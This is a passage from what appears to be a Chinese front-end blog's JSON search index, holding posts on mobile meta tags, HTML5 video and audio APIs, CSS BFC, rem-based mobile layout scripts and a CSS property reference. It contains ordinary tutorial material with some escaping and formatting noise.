initial-scale=0.5, maximum-scale=0.5, user-scalable=0&quot;（用的比较少）\n4、vw/vh 相对于viewport理想视窗(设备)的比例(兼容性不好)1vw = 10%设备宽 10vw\n\nmeta标签属性设置\n\n\n\nIE8浏览器的显示方式:IE&#x3D;edge以IE&#96;最高版本显示\nchrome&#x3D;1 以谷歌浏览器模式渲染(GCF(Google Chrome Frame))\n\n&lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt;\n\n\nreferrer 告诉浏览器链接来源于哪里(计算网页上链接的访问量)\n\n&lt;meta name=&quot;format-detection&quot; content=&quot;telephone=no,email=no,adress=no&quot;&gt;\n\n\n格式检测:（数字、邮箱、地址） no不识别为电话号码、邮箱、地址\n\n&lt;meta name=&quot;apple-mobile-web-app-capable&quot; content=&quot;yes&quot;&gt;\n\n\n删除默认的苹果工具栏、菜单栏(全屏显示)\n\n&lt;meta name=&quot;apple-touch-fullscreen&quot; =&quot;yes&quot;&gt;\n\n\n全屏显示\n\n&lt;meta name=&quot;apple-mobile-web-app-status-bar-style&quot; content=&quot;black&quot;&gt;\n\n\n设置app应用下状态条的颜色\n默认值default (白色) black（黑色）\nblack-translucent（灰色半透明）若果设置为这个值会占据页面的px位置浮在页面上方20px高度 iphone4是40px\n\n&lt;meta name=&quot;renderer&quot; content=&quot;webkit&quot;&gt;\n\n\n360模式固定为极速模式\n\n常见的meta属性\n&lt;meta name=&quot;format-detection&quot; content=&quot;telephone=no&quot;&gt;&lt;meta name=&quot;apple-mobile-web-app-capable&quot; content=&quot;yes&quot;&gt;&lt;meta name=&quot;apple-mobile-web-app-status-bar-style&quot; content=&quot;black&quot;&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0，minimum-scale=1.0&quot;&gt;\n\nlink 扩展\n&lt;link rel=&quot;dns-prefetch&quot; href=&quot;xxx.com&quot;&gt;\n\n\n预解析技术，当浏览网页时，浏览器会在加载页面的时对页面中的域名进行解析缓存，当我们点击这些网页的链接时就不需要再进行DNS的解析，减少用户的等待时间，提高用户的体验度\n\n\nrem 根目录 html 的font-size尺寸默认为16px 1rem = 16px;\n1rem = html的font-size的尺寸大小\n\n","categories":["前端","移动端"],"tags":["html","移动端"]},{"title":"html-原生音视频","url":"/2018/01/28/html+css+js+ts/1-%E9%9F%B3%E8%A7%86%E9%A2%91/","content":"一、video\n1.1 video支持视频格式\n\n常见的视频格式\n\n视频的组成部分：画面、音频、编码格式\n视频编码：H.264、Theora、VP8(google开源)\n\n\nHTML5支持的视频格式：\n\nOgg\n- 带有\n  Theora\n  视频编码+\n  Vorbis\n  音频编码的\n  Ogg\n      文件    - 支持的浏览器:`F`、`C`、`O`- ```  MEPG4\n\n- 带有`H.264`视频编码+`AAC`音频编码的`MPEG4`文件\n- 支持的浏览器: `S`、`C`\n\n\n&#96;&#96;&#96;WebM\n    - 带有`VP8`视频编码+`Vorbis`音频编码的`WebM`格式    - 支持的浏览器: `I`、`F`、`C`、`O`    - 劣势：视频少、转码器几乎没有，不好转码- 想要`video`能自动填充慢父div的大小，只要给`video`标签加上`style=&quot;width= 100%; height=100%; object-fit: fill&quot;`即可### 1.2 标签原型------- 指定一种视频格式，不能播就提示\n\n\n\n您的浏览器不支持video\n- 给定多种视频格式，浏览器根据自身支持程度选择播放哪一种- 注意：多个`source`标签，浏览器会从第一个开始识别，如果第一个不被识别，则会继续识别第二个；如果第一个识别成功，则会直接播放第一种格式视频\n\n\n     //src属性写到source标签中，要指定视频的type类型，例如MP4的即为type=“video/mp4”\n\n     //ogg格式\n\n      //webm格式\n\n\n### 1.3 重要的video标签属性------| 属性(常用)     | 值            | 功能描述                                       || :------------- | :------------ | :--------------------------------------------- || **controls**   | controls      | 是否显示播放控件                               || **autoplay**   | autoplay      | 设置是否打开浏览器后自动播放                   || **width**      | Pilex（像素） | 设置播放器的宽度                               || **height**     | Pilex（像素） | 设置播放器的高度                               || **loop**       | loop          | 设置视频是否循环播放（即播放完后继续重新播放） || **preload**    | preload       | 设置是否等加载完再播放                         || **src**        | url           | 设置要播放视频的url地址                        || **poster**     | imgurl        | 设置播放器初始默认显示图片                     || **autobuffer** | autobuffer    | 设置为浏览器缓冲方式，不设置autoply才有效      |- API 属性| 属性                | 描述                                                       || :------------------ | :--------------------------------------------------------- || audioTracks         | 返回表示可用音轨的 AudioTrackList 对象                     || buffered            | 返回表示音频/视频已缓冲部分的 TimeRanges 对象              || controller          | 返回表示音频/视频当前媒体控制器的 MediaController 对象     || crossOrigin         | 设置或返回音频/视频的 CORS 设置                            || currentSrc          | 返回当前音频/视频的 URL                                    || currentTime         | 设置或返回音频/视频中的当前播放位置（以秒计）              || defaultMuted        | 设置或返回音频/视频默认是否静音                            || defaultPlaybackRate | 设置或返回音频/视频的默认播放速度                          || duration            | 返回当前音频/视频的长度（以秒计）                          || ended               | 返回音频/视频的播放是否已结束                              || error               | 返回表示音频/视频错误状态的 MediaError 对象                || mediaGroup          | 设置或返回音频/视频所属的组合（用于连接多个音频/视频元素） || muted               | 设置或返回音频/视频是否静音                                || networkState        | 返回音频/视频的当前网络状态                                || paused              | 设置或返回音频/视频是否暂停                                || playbackRate        | 设置或返回音频/视频播放的速度                              || played              | 返回表示音频/视频已播放部分的 TimeRanges 对象              || readyState          | 返回音频/视频当前的就绪状态                                || seekable            | 返回表示音频/视频可寻址部分的 TimeRanges 对象              || seeking             | 返回用户是否正在音频/视频中进行查找                        || startDate           | 返回表示当前时间偏移的 Date 对象                           || textTracks          | 返回表示可用文本轨道的 TextTrackList 对象                  || videoTracks         | 返回表示可用视频轨道的 VideoTrackList 对象                 || volume              | 设置或返回音频/视频的音量                                  |- 常用API属性  - `duration`：返回当前音频/视频的长度（以秒计）  - `paused`：设置或返回音频/视频是否暂停  - `currentTime`：设置或返回音频/视频中的当前播放位置（以秒计）  - `ended`：返回音频/视频的播放是否已结束  ### 1.4 Video API------#### 1.4.1 Video 方法------| API             | 事件说明                                                     || :-------------- | :----------------------------------------------------------- || **play**        | video.play(); 播放视频                                       || **pause**       | video.pause(); 暂停播放视频                                  || **load**        | video.load(); 将全部属性回复默认值，视频恢复重新开始状态     || **canPlayType** | var support = videoid.canPlayType(‘video/mp4′);   判断浏览器是否支持当前类型的视频格式  返回值：     空字符串：不支持Maybe：可能支持Probably：完全支持 |- 常用方法  - `play()`：开始播放音频/视频  - `pause()`：暂停当前播放的音频/视频#### 1.4.2网络状态------- 获取video对象\n  Media = document.getElementById(\"media\");\n  - Media.currentSrc  ;  - 返回当前资源的URL- Media.src = value  ;  - 返回或设置当前资源的URL- Media.canPlayType(type)  ;  - 是否能播放某种格式的资源- Media.networkState  ;  - 0.此元素未初始化  - 1.正常但没有使用网络  - 2.正在下载数据  - 3.没有找到资源- Media.load()  ;  - 重新加载src指定的资源- Media.buffered  ;  - 返回已缓冲区域，TimeRanges- Media.preload  ;  - none:不预载  - metadata:预载资源信息  - auto:#### 1.4.3 准备状态------- **Media.readyState**- Media.seeking  ;  - 是否正在seeking#### 1.4.4 回放状态------- Media.currentTime = value  ;  - 当前播放的位置，赋值可改变位置- Media.startTime;  - 一般为0，如果为流媒体或者不从0开始的资源，则不为0- Media.duration  ;  - 当前资源长度 流返回无限- Media.paused  ;  - 是否暂停- Media.defaultPlaybackRate = value  ;  - 默认的回放速度，可以设置- Media.playbackRate = value  ;  - 当前播放速度，设置后马上改变- Media.played  ;  - 返回已经播放的区域，TimeRanges，关于此对象见下文- Media.seekable  ;  - 返回可以seek的区域 TimeRanges- Media.ended  ;  - 是否结束- Media.autoPlay  ;  - 是否自动播放- Media.loop  ;  - 是否循环播放- Media.play()  ;  - 播放- Media.pause()  ;  - 暂停#### 1.4.5 视频控制------- Media.controls;//是否有默认控制条- Media.volume = value; //音量- Media.muted = value; //静音- TimeRanges(区域)对象- TimeRanges.length; //区域段数- TimeRanges.start(index) //第index段区域的开始位置- TimeRanges.end(index) //第index段区域的结束位置#### 1.4.6 相关事件------- 首先绑定事件的话可以通过js中的addEventListener方法来绑定事件| 事件               | 说明                                   || :----------------- | :------------------------------------- || **loadstart**      | 客户端开始请求数据                     || **progress**       | 客户端正在请求数据                     || **suspend**        | 延迟下载                               || **abort**          | 客户端主动终止下载（不是因为错误引起） || **loadstart**      | 客户端开始请求数据                     || **progress**       | 客户端正在请求数据                     || **error**          | 请求数据时遇到错误                     || **stalled**        | 网速失速                               || **play**           | play()和autoplay开始播放时触发         || **pause**          | pause()触发                            || **loadedmetadata** | 成功获取资源长度                       || **loadeddata**     | -                                      || **waiting**        | 等待数据，并非错误                     || **playing**        | 开始回放                               || **canplay**        | 可以播放，但中途可能因为加载而暂停     || **canplaythrough** | 可以播放，歌曲全部加载完毕             || **seeking**        | 寻找中                                 || **seeked**         | 寻找完毕                               || **timeupdate**     | 播放时间改变                           || **ended**          | 播放结束                               || **ratechange**     | 播放速率改变                           || **durationchange** | 资源长度改变                           || **volumechange**   | 音量改变                               |- 常用事件  - `oncanplay`：当文件就绪可以开始播放时运行的脚本（缓冲已足够开始时）。  - `ontimeupdate`： 当播放位置改变时（比如当用户快进到媒介中一个不同的位置时）运行的脚本。  - `onended`：当媒介已到达结尾时运行的脚本（可发送类似“感谢观看”之类的消息）。#### 1.4.7 其他- 全屏:  - `element.webkitRequestFullScreen();`( webkit)  - `element.mozRequestFullScreen();` (Firefox )  - `element.requestFullscreen();` (W3C )- 退出全屏：  - `document.webkitCancelFullScreen()`; (webkit )  - `document.mozCancelFullScreen()`; (Firefox)  - `document.exitFullscreen();` (W3C)## 二、audio------### 2.1 audio格式------- 常见的音频格式  - 音频编码：`ACC`、`MP3`、`Vorbis`- HTML5支持的音频格式：  - `Ogg` 免费 支持的浏览器:`C`、`F`、`O`  - `MP3` 收费 支持的浏览器: `I`、`C`、`S`  - `Wav` 收费 支持的浏览器: `F`、`O`、`S`### 2.2 audio标签中的一些常用属性| 属性         | 属性值   | 注释                                                         || :----------- | :------- | :----------------------------------------------------------- || **src**      | url      | 播放的音乐的url地址（火狐只支持ogg的音乐，而IE9只支持MP3格式的音乐。chrome貌似全支持） || **preload**  | preload  | 预加载（在页面被加载时进行加载或者说缓冲音频），如果使用了autoplay的话那么该属性失效。 || **loop**     | loop     | 循环播放                                                     || **controls** | controls | 是否显示默认控制条（控制按钮）                               || **autoplay** | autoplay | 自动播放                                                     |- 对于音乐格式的支持| 音频格式 | Chrome | Firefox | IE9    | Opera  | Safari || :------- | :----- | :------ | :----- | :----- | :----- || OGG      | 支持   | 支持    | 支持   | 不支持 | 不支持 || MP3      | 支持   | 不支持  | 支持   | 不支持 | 支持   || WAV      | 不支持 | 支持    | 不支持 | 支持   | 不支持 |- audio可通过new来创建。也可以通过用document来获取\n//通过new关键字来创建Audio对象\nvar Music = new Audio(\"test.mp3\");\n\n&#x2F;&#x2F;通过document来获取已经存在的Audio对象var Music &#x3D; document.getElementById(“audio”);&#x2F;&#x2F;当然这里也可以使用document.getElementsByClassName(‘className’)等其他的方法来获取。\n&#96;&#96;&#96;\n2.3 api所提供的对audio标签操作的一些属性和方法\n\n\n\n属性\n注释\n\n\n\nduration\n获取媒体文件的总时长，以s为单位，如果无法获取，返回NaN\n\n\npaused\n如果媒体文件被暂停，那么paused属性返回true，反之则返回false\n\n\nended\n如果媒体文件播放完毕返回true\n\n\nmuted\n用来获取或设置静音状态。值为boolean\n\n\nvolume\n控制音量的属性值为0-1;0为音量最小，1为音量最大\n\n\nstartTime\n返回起始播放时间\n\n\nerror\n返回错误代码，为uull的时候为正常。否则可以通过Music.error.code来获取\n\n\ncurrentTime\n用来获取或控制当前播放的时间，单位为s。\n\n\ncurrentSrc\n以字符串形式返回正在播放或已加载的文件\n\n\n2.4 常用的控制用的函数\n\n\n\n函数\n作用\n\n\n\nload()\n加载音频、视频软件\n\n\nplay()\n加载并播放音频、视频文件或重新播放暂停的的音频、视频\n\n\npause()\n暂停出于播放状态的音频、视频文件\n\n\ncanPlayType(obj)\n测试是否支持给定的Mini类型的文件\n\n\n2.5 audio标签API中的常用事件\n\n首先绑定事件的话可以通过js中的addEventListener方法来绑定事件\n\n\n\n\n事件名称\n事件作用\n\n\n\nloadstart\n客户端开始请求数据\n\n\nprogress\n客户端正在请求数据（或者说正在缓冲）\n\n\nplay\nplay()和autoplay播放时\n\n\npause\npause()方法促发时\n\n\nended\n当前播放结束\n\n\ntimeupdate\n当前播放时间发生改变的时候。播放中常用的时间处理\n\n\ncanplaythrough\n歌曲已经载入完全完成\n\n\ncanplay\n缓冲至目前可播放状态。\n\n\n其实video的api和audio几乎一致。稍稍有点不同。所以基本上会了一个其他的也就都会了s\n","categories":["前端","音视频"],"tags":["html"]},{"title":"css-BFC","url":"/2018/02/20/html+css+js+ts/2-css%20BFC/","content":"BFC 是什么？\nBFC (Block Formatting Contexts) 即块级格式化上下文，从样式上看，它与普通的容器没有什么区别，但是从功能上，BFC 可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC具有普通容器没有的一些特性，例如可以包含浮动元素，使到它可以包含浮动元素，从而防止出现高度塌陷的问题\n\n\n如何触发 BFC\n触发 BFC 的条件\n\n浮动元素，float 除 none 以外的值\n\n绝对定位元素，position（absolute，fixed）\n\ndisplay 为以下其中之一的值 inline-blocks，table-cells，table-captions\n\noverflow 除了 visible 以外的值（hidden，auto，scroll）\n\n在CSS3中，BFC叫做Flow Root，并增加了一些触发条件：\n\ndisplay 的 table-caption 值\n\n\n\n\nposition 的 fixed 值，其实 fixed 是 absolute 的一个子类，因此在 CSS2.1 中使用这个值也会触发 BFC ，只是在CSS3 中更加明确了这一点\n\n\n\nBFC布局规则\n内部的Box会在垂直方向，一个接一个地放置。\nBox垂直方向的距离由margin决定。属于同一个BFC的两个相邻Box的margin会发生重叠\n每个元素的margin box的左边， 与包含块border box的左边相接触(对于从左往右的格式化，否则相反)。即使存在浮动也是如 此。\nBFC的区域不会与float box重叠。\nBFC就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素。反之也如此。\n计算BFC的高度时，浮动元素也参与计算\n\n\nBFC的作用及原理\n自适应两栏布局\n\nbody &#123;       width: 300px;       position: relative;   &#125;   .aside &#123;       width: 100px;       height: 150px;       float: left;       background: #f66;   &#125;   .main &#123;       height: 200px;       background: #fcc;   &#125; &lt;body&gt;       &lt;div class=&quot;aside&quot;&gt;&lt;/div&gt;       &lt;div class=&quot;main&quot;&gt;&lt;/div&gt;&lt;/body&gt;\n\n\n\n根据BFC布局规则第3条：\n每个元素的margin box的左边， 与包含块border box的左边相接触(对于从左往右的格式化，否则相反)。即使存在浮动也是如此。\n\n\n因此，虽然存在浮动的元素aslide，但main的左边依然会与包含块的左边相接触\n根据BFC布局规则第四条：\nBFC的区域不会与float box重叠\n\n\n我们可以通过通过触发main生成BFC， 来实现自适应两栏布局\n\n.main &#123;    overflow: hidden;&#125;\n\n\n当触发main生成BFC后，这个新的BFC不会与浮动的aside重叠。因此会根据包含块的宽度，和aside的宽度，自动变窄。效果如下：\n\n\n\n清除内部浮动\n\n.par &#123;    border: 5px solid #fcc;    width: 300px; &#125;.child &#123;    border: 5px solid #f66;    width: 100px;    height: 100px;    float: left;&#125;&lt;body&gt;    &lt;div class=&quot;par&quot;&gt;        &lt;div class=&quot;child&quot;&gt;&lt;/div&gt;        &lt;div class=&quot;child&quot;&gt;&lt;/div&gt;    &lt;/div&gt;&lt;/body&gt;\n\n\n\n根据\nBFC\n\n布局规则第六条：\n\n计算BFC的高度时，浮动元素也参与计算\n\n\n为达到清除内部浮动，我们可以触发par生成BFC，那么par在计算高度时，par内部的浮动元素child也会参与计算\n\n\n.par &#123;    overflow: hidden;&#125;\n\n\n\n防止垂直 margin 重叠\n\np &#123;    color: #f55;    background: #fcc;    width: 200px;    line-height: 100px;    text-align: center;    margin: 100px;&#125;&lt;p&gt;Haha&lt;/p&gt;&lt;p&gt;Hehe&lt;/p&gt;\n\n\n\n两个p之间的距离为100px，发送了margin重叠\n根据BFC布局规则第二条：\nBox垂直方向的距离由margin决定。属于同一个BFC的两个相邻Box的margin会发生重叠\n\n\n我们可以在p外面包裹一层容器，并触发该容器生成一个BFC。那么两个P便不属于同一个BFC，就不会发生margin重叠了\n\n.wrap &#123;    overflow: hidden;&#125;p &#123;    color: #f55;    background: #fcc;    width: 200px;    line-height: 100px;    text-align: center;    margin: 100px;&#125;&lt;p&gt;Haha&lt;/p&gt;&lt;div class=&quot;wrap&quot;&gt;    &lt;p&gt;Hehe&lt;/p&gt;&lt;/div&gt;\n\n\n\n总结\n其实以上的几个例子都体现了\n布局规则第五条\n\nBFC就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素。反之也如此\n\n\n因为BFC内部的元素和外部的元素绝对不会互相影响，因此， 当BFC外部存在浮动时，它不应该影响BFC内部Box的布局，BFC会通过变窄，而不与浮动有重叠。同样的，当BFC内部有浮动时，为了不影响外部元素的布局，BFC计算高度时会包括浮动的高度。避免margin重叠也是这样的一个道理\n\n\n","categories":["前端"],"tags":["css"]},{"title":"移动端适配","url":"/2018/02/05/html+css+js+ts/1-%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%B8%83%E5%B1%80%E9%80%82%E9%85%8D/","content":"一、为什么要做适配\n为了适应各种移动端设备，完美呈现应有的布局效果\n各个移动端设备，分辨率大小不一致，网页想铺满整个屏幕，并在各种分辨下等比缩放\n\n二、适配方案\n固定高度，宽度百分比适配-布局非常均匀，适合百分比布局\n固定宽度，改变缩放比例适配-什么情况都可以\nRem适配\n像素比适配\n\n三、单位\nem根据元素自身的字体大小计算,元素自身 16px 1em=16px\nRem R -&gt; root 根节点( html ) 根据html的字体大小计算其他元素尺寸\n\n四、百分比适配(常用)\n固定高度，宽度百分比适配\n\n\n根据设置的大小去设置高度，单位可以用px 百分比 auto\n常用Flex布局\n百分比宽度\n\n\n以640设计稿为例，在外层容器上设置最大以及最小的宽\n\n#wrapper &#123;    max-width: 640px; /*设置设计稿的宽度*/    min-width: 300px;    margin: 0 auto;&#125;\n\n\n后面的区块布局都用百分比，具体元素大小用px计算\n\n\n也就是宽度用百分比，高度用px\n高度以及图片不要定死，让它自动撑开\n\n五、Rem适配(常用)\n根据屏幕的分辨率动态设置html的文字大小，达到等比缩放的功能\n保证html最终算出来的字体大小，不能小于12px\n在不同的移动端显示不同的元素比例效果\n如果html的font-size:20px的时候，那么此时的1rem = 20px\n把设计图的宽度分成多少分之一，根据实际情况\nrem做盒子的宽度，viewport缩放\n\n\nhead加入常见的meta属性\n\n&lt;meta name=&quot;format-detection&quot; content=&quot;telephone=no&quot;&gt;&lt;meta name=&quot;apple-mobile-web-app-capable&quot; content=&quot;yes&quot;&gt;&lt;meta name=&quot;apple-mobile-web-app-status-bar-style&quot; content=&quot;black&quot;&gt;&lt;!--这个是关键--&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0，minimum-scale=1.0&quot;&gt;\n\n\n把这段代码加入head中的script预先加载\n\n// rem适配用这段代码动态计算html的font-size大小(function(win) &#123;    var docEl = win.document.documentElement;    var timer = &#x27;&#x27;;    function changeRem() &#123;        var width = docEl.getBoundingClientRect().width;        if (width &gt; 750) &#123; // 750是设计稿大小            width = 750;        &#125;        var fontS = width / 10; // 把设备宽度十等分 1rem=10px        docEl.style.fontSize = fontS + &quot;px&quot;;    &#125;    win.addEventListener(&quot;resize&quot;, function() &#123;        clearTimeout(timer);        timer = setTimeout(changeRem, 30);    &#125;, false);    win.addEventListener(&quot;pageshow&quot;, function(e) &#123;        if (e.persisted) &#123; //清除缓存            clearTimeout(timer);            timer = setTimeout(changeRem, 30);        &#125;    &#125;, false);    changeRem();&#125;)(window)\n\n\n或者使用淘宝提供的库 https://github.com/amfe/lib-flexible\n\n布局细节\n\n结构用section区块划分更语义化\n然后在body设置宽度\n\nbody &#123;    width: 10rem;    margin: auto;&#125;\n\n\n后面的区块都以百分比布局\n\n&lt;div class=&quot;wrapper&quot;&gt;   &lt;header&gt;&lt;header&gt;   &lt;section&gt;&lt;section&gt;   &lt;section&gt;&lt;section&gt;   &lt;section&gt;&lt;section&gt;   &lt;section&gt;&lt;section&gt;&lt;/div&gt;section,header &#123;    width: 100%;&#125;\n\n把视觉稿中的 px 转换成 rem\n\n首先，目前日常工作当中，视觉设计师给到前端开发人员手中的视觉稿尺寸一般是基于 640px 、 750px 以及 1125px 宽度为准。甚至为什么？大家应该懂的（考虑Retina屏）\n\n\n假定设计稿的大小为750，那么我们则将整个图分成10等份来看。&#96;&#96; 对应的 font-size为75px\n\nhtml&#123;\tfont-size: 75px;&#125;\n\n\n这样一来，对于视觉稿上的元素尺寸换算，只需要原始的 px值 除以 rem基准值 即可\n\n\n那么，我们现在就可以比对设计稿，比如设计稿中，有一个div元素，宽度，高度都为20px,那么我们这样写即可（可以用 markman标准设计稿的元素大小）\n\ndiv &#123;\theight: 0.27rem; /*20/75*/\twidth: 0.27rem;&#125;\n\n\n动态计算的rem最后会帮我们动态计算元素在不同屏幕下的宽高\n对于设计稿上的每个元素的尺寸在设计稿大小已知的时候，我们需要测量出，然后在用测量的宽高除以设计稿750的十分之一也就是75,得到我们想要的rem。而rem是根据屏幕动态变化的，也就达到了适配的效果。也就是同一套设计稿运用在不同的设备上。\n\n\n比如当我们切换到320设备大小的时候，这时候1rem=32px; div的像素实际是0.27*32=8.64px``0.27是我们在已知设计稿是750的情况下计算出来的，rem用来动态计算而已\n\n\n对于margin padding line-height width height使用rem计算\n\n如何快速计算\n\n在实际生产当中，如果每一次计算 px 转换 rem ，或许会觉得非常麻烦\n\n\nCSSREM 是一个CSS的 px 值转 rem 值的Sublime Text3自动完成插件\n插件效果\n\n\n\n插件使用方法\n\n\n安装\n\n下载本项目，比如：git clone https://github.com/flashlizi/cssrem\n进入packages目录：Sublime Text -&gt; Preferences -&gt; Browse Packages…\n复制下载的cssrem目录到刚才的packges目录里。\n重启Sublime Text\n\n\n配置参数\n\n参数配置文件：Sublime Text -&gt; Preferences -&gt; Package Settings -&gt; cssrem\n\npx_to_rem - px转rem的单位比例，默认为40【根据设计稿来设置，如设计稿750，我们取十分之一即75】。\n\nmax_rem_fraction_length - px转rem的小数部分的最大长度。默认为6。\n\navailable_file_types - 启用此插件的文件类型。默认为：[“.css“, “.less“, “.sass“]。\n\n\n\n\n文字适配的解决方案\n\n对于一些标题性的文字，我们依然可以用rem。让他随着屏幕来进行缩放，因为标题性文字一般较大，而较大的文字，点阵对其影响就越小。这样，即使出现奇怪的尺寸，也能够让字体得到很好的渲染。\n对于一些正文内容的文字（即站在使用者的角度，你不希望他进行缩放的文字）。我们采用px来进行处理\n\n六、缩放比适配\n固定宽度，改变缩放比例适配\n\n\n设计图的宽度就是网页显示的宽度\n改变视口的缩放比例\n页面宽度固定死\n\n// 缩放比例适配方案--用这个代码 var width = window.screen.width,    fixedW = 320, //设计稿宽度的一半    scale = width / fixedW, // 缩放比例    meta = document.createElement(&#x27;meta&#x27;),    metaAttr = &#123;        name : &#x27;viewport&#x27;,        content : &#x27;width=&#x27;+fixedW+&#x27;, initial-scale=&#x27;+scale+&#x27;, maximum-scale=&#x27;+scale+&#x27;, user-scalable=0&#x27;    &#125;;    for (var key in metaAttr) &#123;        meta[key] = metaAttr[key];    &#125;    document.head.appendChild(meta);\n\n七、像素比适配\nwindow.devicePixelRatio\n物理像素是手机屏幕分辨率\n独立像素 指css像素 屏幕宽度\n像素比 &#x3D; 物理像素 &#x2F; css宽度\n获取设备的像素比 window.devicePixelRatio\n\n八、小结\n关于移动端布局方案有很多，rem和百分比运用最多的\n\n\nhttp://ymblog.net/2015/07/01/移动前端meta标签转/)\n\n","categories":["前端","移动端"],"tags":["html","移动端"]},{"title":"css-基础（1）","url":"/2018/02/24/html+css+js+ts/2-css-%E5%9F%BA%E7%A1%80%EF%BC%881%EF%BC%89/","content":"\n\n\n\n一、CSS 文字属性\n\n\n\n\n语 言\n功 能\n\n\ncolor : #999999;\n文字颜色\n\n\nfont-family:宋体,sans-serif;\n文字字体\n\n\nfont-size:9pt;\n文字大小\n\n\nfont-style:itelic;\n文字斜体\n\n\nfont-variant:small-caps;\n小字体\n\n\nletter-spacing:1pt;\n字间距离\n\n\nline-height : 200%;\n设置行高\n\n\nfont-weight:bold;\n文字粗体\n\n\nvertical-align:sub;\n下标字\n\n\nvertical-align:super;\n上标字\n\n\ntext-decoration:line-through;\n加删除线\n\n\ntext-decoration:overline;\n加顶线\n\n\ntext-decoration:underline;\n加下画线\n\n\ntext-decoration:none;\n删除链接下画线\n\n\ntext-transform:capitalize;\n首字大写\n\n\ntext-transform:uppercase;\n英文大写\n\n\ntext-transform:lowercase;\n英文小写\n\n\ntext-align:right;\n文字右对齐\n\n\ntext-align:left;\n文字左对齐\n\n\ntext-align:center;\n文字居中对齐\n\n\ntext-align:justify;\n文字两端对齐\n\n\nvertical-align属性\n\n\n\nvertical-align:top;\n垂直向上对齐\n\n\nvertical-align:bottom;\n垂直向下对齐\n\n\nvertical-align:middle;\n垂直居中对齐\n\n\nvertical-align:text-top;\n文字垂直向上对齐\n\n\nvertical-align:text-bottom;\n文字垂直向下对齐\n\n\n\n\n\n\n二、CSS 项目符号\n\n\n\n\n\n\n\nlist-style-type:none;\n不编号\n\n\nlist-style-type:decimal;\n阿拉伯数字\n\n\nlist-style-type:lower-roman;\n小写罗马数字\n\n\nlist-style-type:upper-roman;\n大写罗马数字\n\n\nlist-style-type:lower-alpha;\n小写英文字母\n\n\nlist-style-type:upper-alpha;\n大写英文字母\n\n\nlist-style-type:disc;\n实心圆形符号\n\n\nlist-style-type:circle;\n空心圆形符号\n\n\nlist-style-type:square;\n实心方形符号\n\n\nlist-style-image:url(&#x2F;dot.gif)\n图片式符号\n\n\nlist-style-position:outside;\n凸排\n\n\nlist-style-position:inside;\n缩进\n\n\n\n\n\n\n三、CSS 背景样式\n\n\n\n\n\n\n\nbackground-color:#F5E2EC;\n背景颜色\n\n\nbackground:transparent;\n透视背景\n\n\nbackground-image:url(image&#x2F;bg.gif);\n背景图片\n\n\nbackground-attachment:fixed;\n浮水印固定背景\n\n\nbackground-repeat:repeat;\n重复排列-网页默认\n\n\nbackground-repeat:no-repeat;\n不重复排列\n\n\nbackground-repeat:repeat-x;\n在 X 轴重复排列\n\n\nbackground-repeat:repeat-y;\n在 Y 轴重复排列\n\n\nbackground-position:90% 90%;\n背景图片 X 与 Y 轴的位置\n\n\nbackground-position:top;\n向上对齐\n\n\nbackground-position:buttom;\n向下对齐\n\n\nbackground-position:left;\n向左对齐\n\n\nbackground-position:right;\n向右对齐\n\n\nbackground-position:center;\n居中对齐\n\n\n\n\n\n\n四、CSS 链接属性\n\n\n\n\n\n\n\na 所有超链接\n\n\n\na:link\n超链接文字格式\n\n\na:visited\n浏览过的链接文字格式\n\n\na:active\n按下链接的格式\n\n\na:hover\n鼠标转到链接\n\n\ncursor:crosshair\n十字体\n\n\ncursor:s-resize\n箭头朝下\n\n\ncursor:help\n加一问号\n\n\ncursor:w-resize\n箭头朝左\n\n\ncursor:n-resize\n箭头朝上\n\n\ncursor:ne-resize\n箭头朝右上\n\n\ncursor:nw-resize\n箭头朝左上\n\n\ncursor:text\n文字 I 型\n\n\ncursor:se-resize\n箭头斜右下\n\n\ncursor:sw-resize\n箭头斜左下\n\n\ncursor:wait\n漏斗\n\n\n\n\n\n\n五、CSS 边框属性\n\n\n\n\n\n\n\nborder-top:1px solid #6699cc;\n上框线\n\n\nborder-bottom:1px solid #6699cc;\n下框线\n\n\nborder-left:1px solid #6699cc;\n左框线\n\n\nborder-right:1px solid #6699cc;\n右框线\n\n\nsolid\n实线框 2+6010\n\n\n47dotted\n虚线框\n\n\ndouble\n双线框\n\n\ngroove\n立体内凸框\n\n\nridge\n立体浮雕框\n\n\ninset\n凹框\n\n\noutset\n凸框\n\n\n\n\n\n\n六、CSS 表单\n\n\n\n\n\n\n\n&#96;&#96;\n文本域\n\n\n&#96;&#96;\n按钮\n\n\n&#96;&#96;\n复选框\n\n\n&#96;&#96;\n单选按钮\n\n\n选项1\n\n\n\n\n列表菜单\n\n\n&#96;&#96;\n多行文本域\n\n\n\n\n\n\n七、CSS 边界样式\n\n\n\n\n\n\n\nmargin-top:10px;\n上边界\n\n\nmargin-right:10px;\n右边界值\n\n\nmargin-bottom:10px;\n下边界值\n\n\nmargin-left:10px;\n左边界值\n\n\n\n\n\n\n八、CSS 边框空白\n\n\n\n\n\n\n\npadding-top:10px;\n上边框留空白\n\n\npadding-right:10px;\n右边框留空白\n\n\npadding-bottom:10px;\n下边框留空白\n\n\npadding-left:10px;\n左边框留空白\n\n\n","categories":["前端"],"tags":["css"]},{"title":"html与xml的区别","url":"/2018/01/15/html+css+js+ts/1-html%E4%B8%8Exml%E7%9A%84%E5%8C%BA%E5%88%AB/","content":"xml和html之间的区别有哪些\n区别：1、XML用于传输和存储数据，侧重于数据；HTML用于显示数据并关注数据的外观。2、XML区分大小写；HTML不区分大小写。3、XML强制要求使用结束标记；而HTML中没有强制要求使用结束标记。4、XML保留空格；HTML不保留空格。\n\n\n本教程操作环境：windows7系统、HTML5版、Dell G3电脑。\n什么是xml？xml是一种可扩展标记语言，用于描述数据，可以以轻松检索和共享的形式存储数据。\nxml的特征：1、XML（可扩展标记语言）是一种标记语言。\n2、XML旨在存储和传输数据。\n3、XMl的创建是为了提供一个易于使用和存储的自描述数据。\n4、XML不是HTML的替代品。\n5、XML旨在实现自我描述。\n6、XML旨在传输数据，而不是显示数据。\n7、XML标签没有预定义，因此我们必须定义好自己的标签才可以使用。\n8、XML独立于平台且与语言无关。\nxml的主要优点：可以使用xml从Microsoft 